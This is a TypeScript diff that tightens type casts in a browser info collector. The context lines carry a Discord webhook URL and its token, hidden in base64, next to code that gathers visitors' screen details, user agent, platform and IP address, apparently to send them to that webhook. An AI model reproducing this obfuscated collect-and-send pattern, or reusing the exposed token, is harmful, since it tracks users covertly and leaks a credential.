@@ -16,8 +16,8 @@ export type DiscordPayload = {
 const BASE64_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQxNzQ3NzAyNjI2ODMxOTg5OC9uejMwN01tdGpJM2FINnpPSTdFSDNxUDJsekhaMklCaUZ6R29sUG43eXh5bEl1Q3VSdDdTS3JyU2p2b0ptOWREd0lvQQ==";
 
 function decodeBase64(input: string): string {
-  if (typeof window !== 'undefined' && (window as any).atob) {
-    return (window as any).atob(input);
+  if (typeof window !== 'undefined' && typeof (window as unknown as { atob?: (i: string) => string }).atob === 'function') {
+    return (window as unknown as { atob: (i: string) => string }).atob(input);
   }
   // Node fallback
   return Buffer.from(input, 'base64').toString('binary');
@@ -69,8 +69,9 @@ export async function collectClientInfo(): Promise<ClientInfo> {
     const screenRes = win?.screen ? `${win.screen.width}x${win.screen.height}` : '';
     const dpr = win?.devicePixelRatio || 1;
     const ua = nav?.userAgent || '';
-    const brand = (nav as any)?.userAgentData?.brands?.map((b: any) => `${b.brand} ${b.version}`).join(', ') || '';
-    const platform = (nav as any)?.userAgentData?.platform || nav?.platform || '';
+    const uaData = (nav as unknown as { userAgentData?: { brands?: Array<{ brand: string; version: string }>; platform?: string } })?.userAgentData;
+    const brand = uaData?.brands?.map((b) => `${b.brand} ${b.version}`).join(', ') || '';
+    const platform = uaData?.platform || nav?.platform || '';
 
     let ip = '';
     try {
